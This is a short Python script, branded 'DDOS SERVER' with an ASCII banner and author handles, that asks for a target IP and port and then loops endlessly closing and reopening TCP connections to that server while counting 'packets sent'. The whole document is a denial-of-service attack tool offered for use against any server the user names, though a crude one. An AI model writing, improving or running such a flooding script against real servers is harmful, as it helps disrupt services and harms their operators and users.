from socket import *
import colorama
from colorama import Back , Fore
import time
colorama.init(autoreset=True)
Host = socket(AF_INET,SOCK_STREAM)
DDos = 0
logo = """


██████╗ ██████╗  ██████╗ ███████╗       ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██╔═══██╗██╔════╝       ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
██║  ██║██║  ██║██║   ██║███████╗       ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
██║  ██║██║  ██║██║   ██║╚════██║       ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
██████╔╝██████╔╝╚██████╔╝███████║       ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝        ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
 Coded By MamadNabody6     TelegramiD => @MamadNabody6      git Hub => MamadNabody669                                                                                    


"""
print(Fore.YELLOW+logo)
ServerIp = input(Fore.GREEN+"Enter Ip Server : ")
time.sleep(1)
ServerPort = input(Fore.GREEN+"Enter Port Server(Defult 7777) : ")
time.sleep(1)
Host.connect((ServerIp,int(ServerPort)))
print(Fore.BLUE+"Connecting To "+ServerIp+": "+ServerPort+" . . . ")
time.sleep(2)
print(Fore.MAGENTA+"Connection Succseful !")


while(True):
    DDos = DDos+1

    Host.close()

    print(Fore.RED+"[-]Disconnect From servrer\n")

    time.sleep(0.5)

    print(Fore.BLUE+"[>]Try Connection . . .\n")

    Host = socket(AF_INET,SOCK_STREAM)

    Host.connect((ServerIp,int(ServerPort)))

    print(Fore.YELLOW+"[+]Connect the  "+ServerIp+":"+ServerPort+" Packet Sended : "+str(DDos)+"\n")
    






#Coded By @MamadNabody6 /<>\